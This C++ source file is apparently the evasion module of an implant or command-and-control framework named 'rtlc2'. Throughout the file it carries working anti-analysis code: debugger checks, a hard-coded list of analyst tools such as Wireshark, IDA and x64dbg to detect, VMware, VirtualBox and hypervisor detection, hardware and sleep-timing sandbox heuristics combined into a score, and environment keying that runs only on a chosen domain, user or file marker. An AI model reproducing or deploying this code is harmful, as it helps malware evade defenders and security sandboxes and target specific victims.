#include "evasion.h"
#include <chrono>
#include <thread>
#include <cstring>

#ifdef RTLC2_WINDOWS
#include <windows.h>
#include <intrin.h>
#include <tlhelp32.h>
#else
#include <unistd.h>
#include <fstream>
#include <string>
#endif

namespace rtlc2 {
namespace evasion {

bool IsDebuggerPresent() {
#ifdef RTLC2_WINDOWS
    // Check PEB directly
    if (::IsDebuggerPresent()) return true;

    // NtGlobalFlag check
    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    return debugged != FALSE;
#else
    // Check /proc/self/status for TracerPid on Linux
    #ifdef RTLC2_LINUX
    std::ifstream status("/proc/self/status");
    std::string line;
    while (std::getline(status, line)) {
        if (line.find("TracerPid:") != std::string::npos) {
            int pid = std::atoi(line.c_str() + 10);
            return pid != 0;
        }
    }
    #endif
    return false;
#endif
}

bool HasAnalysisTools() {
#ifdef RTLC2_WINDOWS
    // Check for common analysis process names
    const wchar_t* tools[] = {
        L"wireshark.exe", L"procmon.exe", L"procexp.exe", L"x64dbg.exe",
        L"x32dbg.exe", L"ollydbg.exe", L"ida.exe", L"ida64.exe",
        L"processhacker.exe", L"pestudio.exe", L"fiddler.exe",
        L"tcpview.exe", L"autoruns.exe", L"regmon.exe", L"filemon.exe",
        nullptr
    };

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    if (Process32FirstW(snap, &pe)) {
        do {
            for (int i = 0; tools[i] != nullptr; i++) {
                if (_wcsicmp(pe.szExeFile, tools[i]) == 0) {
                    CloseHandle(snap);
                    return true;
                }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
#endif
    return false;
}

bool IsVirtualMachine() {
#ifdef RTLC2_WINDOWS
    // Check for VM-related registry keys
    HKEY hKey;

    // VMware check
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }

    // VirtualBox check
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Oracle\\VirtualBox Guest Additions", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }

    // Hyper-V check via CPUID
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 1);
    bool hypervisor = (cpuInfo[2] >> 31) & 1;
    return hypervisor;
#elif defined(RTLC2_LINUX)
    // Check DMI data
    std::ifstream vendor("/sys/class/dmi/id/sys_vendor");
    std::string v;
    if (std::getline(vendor, v)) {
        if (v.find("VMware") != std::string::npos ||
            v.find("VirtualBox") != std::string::npos ||
            v.find("QEMU") != std::string::npos ||
            v.find("Xen") != std::string::npos) {
            return true;
        }
    }
#endif
    return false;
}

bool HasMinimumHardware(int min_cpus, int min_ram_gb) {
#ifdef RTLC2_WINDOWS
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (static_cast<int>(si.dwNumberOfProcessors) < min_cpus) return false;

    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    int ram_gb = static_cast<int>(ms.ullTotalPhys / (1024ULL * 1024ULL * 1024ULL));
    if (ram_gb < min_ram_gb) return false;
#else
    long cpus = sysconf(_SC_NPROCESSORS_ONLN);
    if (cpus < min_cpus) return false;

    long pages = sysconf(_SC_PHYS_PAGES);
    long page_size = sysconf(_SC_PAGE_SIZE);
    long ram_gb = (pages * page_size) / (1024L * 1024L * 1024L);
    if (ram_gb < min_ram_gb) return false;
#endif
    return true;
}

bool TimingCheck() {
    // If a sleep of 1 second completes in < 900ms, likely fast-forwarded/emulated
    auto start = std::chrono::steady_clock::now();

#ifdef RTLC2_WINDOWS
    Sleep(1000);
#else
    usleep(1000000);
#endif

    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now() - start).count();

    return elapsed < 900; // Returns true if suspiciously fast
}

bool IsSandbox() {
    // Multiple checks combined - if 2+ are triggered, likely sandbox
    int score = 0;

    // Check 1: Debugger
    if (IsDebuggerPresent()) score += 3;

    // Check 2: Analysis tools
    if (HasAnalysisTools()) score += 2;

    // Check 3: Minimum hardware (sandboxes often have < 2 CPUs, < 2GB RAM)
    if (!HasMinimumHardware(2, 2)) score += 2;

    // Check 4: Timing anomaly
    if (TimingCheck()) score += 2;

    // Threshold: score >= 3 = sandbox
    return score >= 3;
}

bool EnvironmentKeyCheck(const char* domain, const char* user, const char* fileMarker) {
    // If all checks are empty, no keying required — allow execution
    bool hasDomain = domain && domain[0] != '\0';
    bool hasUser = user && user[0] != '\0';
    bool hasFile = fileMarker && fileMarker[0] != '\0';
    if (!hasDomain && !hasUser && !hasFile) return true;

#ifdef RTLC2_WINDOWS
    // Domain check
    if (hasDomain) {
        char buf[256] = {};
        DWORD sz = sizeof(buf);
        // GetComputerNameExA with ComputerNameDnsDomain = 2
        if (GetComputerNameExA((COMPUTER_NAME_FORMAT)2, buf, &sz)) {
            if (strstr(buf, domain) == nullptr) return false;
        } else {
            return false;
        }
    }

    // Username check
    if (hasUser) {
        char buf[256] = {};
        DWORD sz = sizeof(buf);
        GetUserNameA(buf, &sz);
        if (_stricmp(buf, user) != 0) return false;
    }

    // File marker check
    if (hasFile) {
        DWORD attrs = GetFileAttributesA(fileMarker);
        if (attrs == INVALID_FILE_ATTRIBUTES) return false;
    }
#else
    // POSIX: domain check via hostname
    if (hasDomain) {
        char buf[256] = {};
        gethostname(buf, sizeof(buf));
        if (strstr(buf, domain) == nullptr) return false;
    }

    // Username check
    if (hasUser) {
        const char* u = getenv("USER");
        if (!u || strcmp(u, user) != 0) return false;
    }

    // File marker check
    if (hasFile) {
        if (access(fileMarker, F_OK) != 0) return false;
    }
#endif

    return true;
}

} // namespace evasion
} // namespace rtlc2
